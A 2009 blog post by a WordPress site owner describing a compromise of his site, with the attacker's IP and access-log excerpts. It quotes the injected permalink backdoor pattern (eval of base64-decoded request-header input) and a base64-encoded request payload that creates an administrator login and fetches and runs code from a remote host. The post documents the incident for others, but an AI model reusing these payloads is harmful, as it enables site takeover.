---
layout: post
title: Wordpress Hacker This Morning.
comments: true
categories:
- Site News
---
I hate hackers - they are stupid (mostly) and generally not real productive at actually accomplishing anything except breaking things and causing unnecessary extra work for those that actually contribute to society.

Anyway I am sorry to all of the people that could not get to my site this morning. A wave of Wordpress attacks hit not only me but a ton of Wordpress sites all over the place - just googleÂ /%&amp;({${eval(base64_decode($_SERVER[HTTP_EXECCODE]))}}|.+)&amp;%/ if you want to see a bunch of them yourself (yep google already indexed them)

Anyway the attack appears to be coming from IP address 122.135.85.220. I just finished firing up a new virtual server with pristine code/data for all of you out there and am just starting to run this down. If anyone wants to help you have the source IP and this looks like the exploit used but I am still researching the entire sequence of events from my logs. It maybe that this is all there is to it but I want to be thorough.

Here is what I believe to be the hack:

<code>
48195 122.135.85.220 - - [04/Sep/2009:04:53:21 -0400] "GET /wp-login.php HTTP/1. Â  Â  Â 1" 200 1948 "http://photo.rwboyer.com/" "Mozilla/5.0 (Windows; U; Windows</code>

<code>NT 5.1; en-US; rv:1.7) Gecko/20040803 Firefox/0.9.3"48196 122.135.85.220 - - [04/Sep/2009:04:53:24 -0400] "POST /wp-login.php HTTP/1 Â  Â  Â .1" 302 - "http://photo.rwboyer.com/wp-login.php" "Mozilla/5.0 (Windows; U

; Windows NT 5.1; en-US; rv:1.7) Gecko/20040803 Firefox/0.9.3"48197 122.135.85.220 - - [04/Sep/2009:04:53:28 -0400] "GET /wp-admin/ HTTP/1.1"

200 34669 "http://photo.rwboyer.com/wp-login.php" "Mozilla/5.0 (Windows; U Â  Â  Â ; Windows NT 5.1; en-US; rv:1.7) Gecko/20040803 Firefox/0.9.3"

48198 122.135.85.220 - - [04/Sep/2009:04:53:34 -0400] "GET /wp-admin//options-pe Â  Â  Â rmalink.php HTTP/1.1" 200 15153 "http://photo.rwboyer.com/wp-admin//option Â  Â  Â s-permalink.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7)

</code>

<code>Gecko/20040803 Firefox/0.9.3"48199 122.135.85.220 - - [04/Sep/2009:04:53:37 -0400] "POST /wp-admin//options-p Â  Â  Â ermalink.php HTTP/1.1" 200 15312 "http://photo.rwboyer.com/wp-admin//optio Â  Â  Â ns-permalink.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7) Â  Â  Â  Gecko/20040803 Firefox/0.9.3"48200 122.135.85.220 - - [04/Sep/2009:04:53:41 -0400] "POST /xmlrpc.php HTTP/1.1 Â  Â  Â " 200 173 "JHJvbGU9J2FkbWluaXN0cmF0b3InOyR1c2VyX2xvZ2luPSdKZXJhbXlEZWNrNzk Â  Â  Â nOyR1c2VyX3Bhc3M9J09nck8hSTMkTGQhISc7ZXZhbChmaWxlX2dldF9jb250ZW50cygnaHR0c Â  Â  Â DovL2xpbmtzLndlYndvcmRwcmVzcy5jbi9kYXRhL3Nob3J0cGFydDIudHh0JykpO2V4aXQ7" " Â  Â  Â Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7) Gecko/20040803 Fir Â  Â  Â efox/0.9.3"
</code>
RB